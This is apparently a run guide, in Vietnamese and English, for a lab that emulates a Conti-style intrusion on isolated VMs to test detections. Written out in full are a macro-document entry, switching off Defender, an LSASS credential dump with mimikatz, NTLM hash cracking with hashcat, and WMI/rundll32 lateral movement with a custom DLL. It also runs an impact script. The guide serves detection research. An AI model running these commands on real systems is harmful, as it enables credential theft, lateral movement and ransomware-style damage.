# C0015 — Full campaign run guide (phases 1→3) — COMMAND BY COMMAND

One pass, ONE `run_id`. Thay mọi `RUN-20260928-02` bằng run_id thật của bạn.
Máy: **[KALI]** build host · **[C2]** = 192.168.50.1 (repo) · **[WS01]** = 192.168.50.20 (duc.user) · **[FS01]** = 192.168.50.30.
Password LUÔN gõ tay ở prompt (`*` / runas) — không bao giờ lên command line, file hay log.

---

## PHASE 0 — Build + môi trường

### [KALI] — payload
```bash
cd C0015-Conti-Detection-Lab
git checkout main && git pull
./payloads/packaging/build_dll.sh                                          # -> build/out/c0015-comparefor.jpg
x86_64-w64-mingw32-gcc -shared -o c0015_143_surrogate.dll \
    payloads/dll/c0015_143_surrogate.c -luser32 -lshlwapi
git clone https://github.com/ParrotSec/mimikatz
sha256sum mimikatz/x64/mimikatz.exe                                        # verify hash trước khi dùng
# chuyển về C2 host
scp c0015_143_surrogate.dll mimikatz/x64/mimikatz.exe user@192.168.50.1:stage/ws01/
```
### [C2] — preflight
```powershell
cd C0015-Conti-Detection-Lab
git pull
# (nếu máy Kali chưa gửi): đặt c0015_143_surrogate.dll + mimikatz.exe vào stage\ws01\
New-Item -Force -ItemType Directory stage\ws01
# cấu hình phase7: copy template rồi SỬA run_id
Copy-Item payloads\config\c0015-phase7.example.ini stage\ws01\config-phase7.ini
notepad stage\ws01\config-phase7.ini        # run_id=RUN-20260928-02
# tắt AV vĩnh viễn (mỗi VM) — xem docs/attack-runbook.md step 4 (Tamper OFF -> policy -> prefs -> Get-MpComputerStatus)
```
### [WS01 + FS01] — gates (mỗi máy)
```powershell
runas /user:C0015\it.admin "cmd /c whoami /groups"     # phải có SeDebugPrivilege = it.admin ∈ local Administrators
where wmic                                              # WS01 (bản 24H2+ không có -> dùng CIM, ghi PARTIAL)
& C:\Tools\sysmon64.exe -c C:\Tools\sysmon-c0015-balanced.xml
```
### [WS01] — đặt file stage trước
```powershell
New-Item -Force -ItemType Directory C:\stage
# copy từ C2 host / USB: c0015_143_surrogate.dll, config-phase7.ini, mimikatz.exe vào C:\stage\
```

---

## PHASE 1 — Entry → bootstrap → session 1 (S1–S3)

### [C2] — Pre (tự sinh config + start servers)
```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action Pre
# kiểm tra thủ công:
Get-Content c2sim.log -Tail 3
Invoke-WebRequest -UseBasicParsing http://192.168.50.1:8000/c0015-comparefor.jpg   # 200
```
### [WS01] — S0 seed + stage + mở doc
```powershell
runas /user:C0015\it.admin "cmd /c ping -t 127.0.0.1"    # GIỮ cửa sổ mở tới hết S9
powershell -ExecutionPolicy Bypass -File .\stage_ws01.ps1 -Source C:\stage
powershell -ExecutionPolicy Bypass -File .\install_macro_docm.ps1 -MacroSource .\macro_payload.vba
# mở test.docm, bấm Enable Content (ĐÚNG 1 lần)
```
### [C2] — chờ + verify phase 1
```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action P1
# hoặc thủ công:
Get-Content c2sim.log -Tail 20                        # 1 dòng: register stage=phase3 host=WS01 token=… ok=True (registered)
(Invoke-RestMethod "http://192.168.50.1:8080/sessions") | Format-Table
```

---

## PHASE 2 — Operator: discovery → credential → WMI pivot → session 2 (S4–S9)

### [C2] — P2: runbook tự chạy + chờ
```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action P2
# tự động: enqueue runbook c0015-phase2 (11 lệnh) -> beacon xử lý trên WS01 -> chờ xong -> tạo template artifact
# (thủ công nếu muốn):
$tok = (Invoke-RestMethod "http://192.168.50.1:8080/sessions" | Where-Object stage -eq 'phase3').token
Invoke-RestMethod -Method Post -Uri "http://192.168.50.1:8080/runbook?session=$tok&name=c0015-phase2"
Get-Content c2sim.log -Tail 40                        # 11 dòng task=OP-CMD ... result ... ok=True (accepted)
```
◉ Elastic (khi có): E1 parent=beacon cho net/tasklist/nltest/ping/powershell; E11 `found_shares.txt` (DIRECT link).

### [WS01] — các bước tay (S7 → S7b → S8a → S8b)
Chạy hướng dẫn hoặc gõ tay:
```powershell
pwsh -ExecutionPolicy Bypass -File payloads\packaging\run_ws01_operator.ps1 -RunId RUN-20260928-02 -StagingDir C:\stage
```
**S7 — thử credential (password ở prompt):**
```powershell
net use \\FS01\IPC$ /user:C0015\duc.user *        # A. denied (error 5) -> S4625
net use \\FS01\IPC$ /delete
net use \\FS01\IPC$ /user:C0015\it.admin *        # B. allowed -> S4648 + FS01 4624 T3/4672 — GIỮ, đừng delete
net use \\FS01\IPC$ /user:C0015\<revoked> *       # C. denied
net use \\FS01\IPC$ /delete
```
**S7b — LSASS dump thật:**
```powershell
copy C:\stage\mimikatz.exe C:\Tools\
runas /user:C0015\it.admin "C:\Tools\mimikatz.exe sekurlsa::logonpasswords"
# trong output: tìm dòng it.admin -> LẤY NTLM hash (Win hiện đại không có plaintext)
```
**[KALI] — crack:**
```bash
echo -n '<NTLM_HASH>' > /tmp/itadmin.ntlm
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
hashcat -m 1000 /tmp/itadmin.ntlm /usr/share/wordlists/rockyou.txt --show
# hoặc: john --format=nt /tmp/itadmin.ntlm --wordlist=/usr/share/wordlists/rockyou.txt
rm -f /tmp/itadmin.ntlm     # giá trị chỉ ở trong bộ nhớ operator; KHÔNG vào repo/log
```
**S8a — tool handoff (C:\stage trên WS01):**
```powershell
New-Item -Force -ItemType Directory \\FS01\C$\C0015
copy C:\stage\c0015_143_surrogate.dll \\FS01\C$\C0015\
copy C:\stage\c0015_beacon.ps1            \\FS01\C$\C0015\
copy C:\stage\config-phase7.ini           \\FS01\C$\C0015\config-phase7.ini
```
**S8b — WMI pivot (dùng PLAINTEXT CRACKED ở prompt runas):**
```powershell
runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\\C0015\\c0015_143_surrogate.dll,LabEntry\""
# fallback nếu không có wmic:
$cred = Get-Credential C0015\it.admin
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -ComputerName FS01 -Credential $cred `
  -Arguments @{ CommandLine = 'rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry' }   # ghi PARTIAL
```
### [C2] — artifacts + chờ S9
```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action Artifacts
# trước khi chạy từng lệnh: điền TBD trong stage\ws01\found_shares.json / target-manifest.json /
#   auth-bundle.json / remote-process.json (sha256, LogonId...) rồi chạy 4 artifact-new được in ra
# P2 sẽ tự chờ receipt; kiểm tra tay:
Get-ChildItem evidence\run-ledger | Sort-Object LastWriteTime | Select-Object -Last 5   # ART-07-01-<token8>.json
Get-Content c2sim.log -Tail 15                                    # register phase7-session2 ok=True + T-DISCOVER-CORPUS
```
◉ Elastic FS01: E1 rundll32 (cùng ProcessGuid S8b) → **E7** `C:\C0015\c0015_143_surrogate.dll` (hash=ART-06-01) → E11 `c0015_143-executed.txt` → E3 `:8080`. Chốt = receipt + callback cùng run.

---

## PHASE 3 — Collection / transfer / RDP / impact (S10–S14)

### [C2] — in ra các bước
```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action P3
```
**S10 — manifest (đọc corpus rồi tạo ART-08-01):**
```powershell
# FS01 (session2): dir \\FS01\IT, \\FS01\Finance
# C2 host (cần bản corpus local hoặc chạy trên FS01 có repo):
python scripts/lab_tools.py manifest-new <corpus_dir> RUN-20260928-02 -o stage\ws01\art08_01.json
```
**S11 — transfer:** ⚠️ sink `p5_sink` chưa tồn tại trong repo — cần sink để chạy POST; offline cross-check:
```powershell
python scripts/lab_tools.py receipt-check <receipt.json> <manifest.json> <allowlist.json>
```
**S12 — RDP:** `mstsc /v:FS01` → logon `C0015\it.admin` (cần DET-008; S4624 Type 10 + 4778/4779).
**S13 — AnyDesk-like:** thủ công — cài portable app vào path đặc biệt; nhánh LSASS = fixtures/replay (không chạy).
**S14 — impact (trên FS01 có bản repo):**
```powershell
pwsh -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Prepare
pwsh -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Run
pwsh -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Verify
pwsh -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Rollback
pwsh -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Verify
```
**S15 — score:** `python scripts/lab_tools.py score <ground_truth> <reconstruction> -o art15_01.json`

---

## Cleanup
```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Stop
# WS01:
Remove-Item -Recurse -Force C:\Users\Public\C0015, "$env:USERPROFILE\Desktop\test.docm"
# FS01 + WS01:
Remove-Item -Recurse -Force C:\C0015 ; Remove-Item C:\Tools\mimikatz.exe -Force
# Ctrl+C cửa sổ S0; bật lại Defender (gỡ policy, bật Tamper Protection, Update-MpSignature)
```
Verify queries + join keys: `docs/phase2-detection-prep-s4-s9.md` · `docs/run-phase2-checklist.md`.